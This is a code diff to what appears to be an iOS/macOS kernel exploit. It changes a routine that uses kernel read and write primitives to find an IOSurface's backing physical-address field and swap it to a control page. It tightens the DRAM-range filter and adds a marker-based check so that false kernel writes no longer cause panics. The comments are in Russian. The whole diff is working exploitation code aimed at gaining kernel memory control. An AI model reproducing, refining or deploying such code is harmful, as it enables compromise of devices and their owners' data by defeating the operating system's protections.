@@ -5782,6 +5782,10 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     if (!kpRead(pageS, pgS, sizeof(pgS), "src obj page", r)) { free(ctl); return r; }
     uint32_t idOffD = (uint32_t)(surfObjVA - pageD);
     uint32_t idOffS = (uint32_t)(srcObjVA - pageS);
+    // 1.9.104: PA-фильтр = реальный DRAM-диапазон (константа 0x10122000000
+    // проходила широкий фильтр и убивала нас дважды — паники 081559/082748)
+    uint64_t paLo = kconstant(physBase);
+    uint64_t paHi = paLo + kconstant(physSize);
     int hitOff = -1;   // смещение относительно ID-поля (может быть отрицательным)
     uint64_t hitVA = 0, srcPAval = 0, dstPAval = 0;
     for (int k = -0x100; k + 8 <= 0x300; k += 8) {
@@ -5791,8 +5795,8 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         memcpy(&qd, pgD + oD, 8);
         memcpy(&qs, pgS + oS, 8);
         if (qd == qs) continue;
-        BOOL dstPa = (qd > 0x10000000000ULL && qd < 0x20000000000ULL);
-        BOOL srcPa = (qs > 0x10000000000ULL && qs < 0x20000000000ULL);
+        BOOL dstPa = (qd >= paLo && qd < paHi && !(qd & 0x3FFF));
+        BOOL srcPa = (qs >= paLo && qs < paHi && !(qs & 0x3FFF));
         if (dstPa && srcPa) {
             kpNote(r, [NSString stringWithFormat:@"  diff ID%+#x: dst=%#llx src=%#llx ← кандидат backing PA", k,
                       (unsigned long long)qd, (unsigned long long)qs]);
@@ -5839,8 +5843,8 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 memcpy(&qd2, d2 + o2, 8);
                 memcpy(&qs2, s2 + o2, 8);
                 if (qd2 == qs2) continue;
-                BOOL dPa = (qd2 > 0x10000000000ULL && qd2 < 0x20000000000ULL);
-                BOOL sPa = (qs2 > 0x10000000000ULL && qs2 < 0x20000000000ULL);
+                BOOL dPa = (qd2 >= paLo && qd2 < paHi && !(qd2 & 0x3FFF));
+                BOOL sPa = (qs2 >= paLo && qs2 < paHi && !(qs2 & 0x3FFF));
                 if (dPa && sPa) {
                     kpNote(r, [NSString stringWithFormat:@"    lvl2 [ID%+#x: dst→%#llx src→%#llx] +0x%02x: dst=%#018llx src=%#018llx ← ПАРА backing PA",
                               k, (unsigned long long)uD, (unsigned long long)uS, o2,
@@ -5852,7 +5856,25 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     }
 
     // 4. swap the REAL backing field (if found) → control page, submit, check
+    // 1.9.104: ДОКАЗАТЕЛЬСТВО маркером до записи — пишем 0x41544159 в пиксели
+    // dst (IOSurfaceLock) и читаем кандидат-PA через phystokv. Совпало =
+    // backing настоящий → пишем. Нет = ложный кандидат → запись БЛОКИРОВАНА
+    // (ложный kwrite в чужой объект = zbound panic, дважды проверено).
     uint64_t origPA = 0;
+    if (hitOff >= 0 && hitVA) {
+        uint32_t marker = 0x41544159;
+        IOSurfaceLock(dstS, 0, NULL);
+        uint8_t *pix = (uint8_t *)IOSurfaceGetBaseAddress(dstS);
+        if (pix) *(volatile uint32_t *)pix = marker;
+        IOSurfaceUnlock(dstS, 0, NULL);
+        uint64_t candKVA = gPrimitives.phystokv ? gPrimitives.phystokv(dstPAval) : 0;
+        uint32_t probe = 0;
+        BOOL proof = candKVA && kpRead(candKVA, &probe, 4, "backing proof", r) && probe == marker;
+        kpNote(r, [NSString stringWithFormat:@"  PROOF: маркер %#x в пикселях dst, kread phystokv(%#llx)=%#x → backing %@",
+                  marker, (unsigned long long)dstPAval, probe,
+                  proof ? @"ПОДТВЕРЖДЁН — пишем" : @"ЛОЖНЫЙ — запись заблокирована"]);
+        if (!proof) { hitOff = -1; hitVA = 0; }
+    }
     if (hitOff >= 0 && hitVA) {
         kreadbuf(hitVA, &origPA, 8);
         kpNote(r, [NSString stringWithFormat:@"  ПОДМЕНА backing %#llx → %#llx (контрольная)", (unsigned long long)origPA, (unsigned long long)ctlPA]);
